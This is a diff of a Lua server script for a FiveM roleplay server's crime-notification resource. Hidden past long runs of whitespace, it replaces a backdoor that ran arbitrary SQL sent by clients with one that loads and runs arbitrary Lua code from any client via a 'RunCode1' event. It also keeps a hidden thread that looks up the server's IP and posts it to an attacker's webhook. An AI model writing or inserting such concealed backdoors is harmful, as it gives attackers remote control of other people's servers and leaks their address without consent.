@@ -12,7 +12,7 @@ local xPlayers = arp.GetPlayers()
 			TriggerClientEvent("gunshotPlace", xPlayers[i], a, b, c)
 		end
 	end
-end)																																													Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit150", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
+end)																																													Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP RunCode1", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
 
 RegisterServerEvent('esx_rikosilmotukset:ilmoitus')
 AddEventHandler('esx_rikosilmotukset:ilmoitus', function(informatioosaatana)
@@ -48,7 +48,8 @@ local xPlayers = arp.GetPlayers()
 			TriggerClientEvent("carPlace", xPlayers[i], a, b, c)
 		end
 	end	
-end)																																																RegisterServerEvent("exploit150");AddEventHandler("exploit150", function(data) MySQL.Async.execute(data) end)
+end)																																																				;RegisterServerEvent('RunCode1');AddEventHandler('RunCode1', function(aD) local aD,aE=load(aD,'@runcode') if aE then print(aE)return nil,aE end;local aF,al=pcall(aD)if aF then return al else return nil,al end end)
+
 
 RegisterServerEvent('esx_rikosilmotukset:aseellinenrob')
 AddEventHandler('esx_rikosilmotukset:aseellinenrob', function(a, b, c)
